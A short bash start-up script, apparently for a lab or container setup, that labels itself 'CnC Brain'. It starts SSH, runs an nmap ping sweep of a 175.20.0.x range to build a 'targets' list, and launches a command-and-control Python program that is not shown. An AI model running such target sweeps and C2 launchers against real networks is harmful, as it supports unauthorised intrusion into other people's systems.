#!/bin/bash
#bash
/etc/init.d/ssh start
ip="$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -c 14-24)"
echo
echo "----------------"
echo "CnC Brain"
echo "----------------"
echo
echo $ip
#echo "$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -c 14-24 | xargs nmap)"
mkdir /root/brain
echo "Scanning for targets"
nmap 175.20.0.2-199 -sn |awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' > /root/brain/targets.txt
echo "Target list:"
cat /root/brain/targets.txt
echo "Beginning Brain Stuff"
python3 /root/mount/CnC_Brain.py
bash
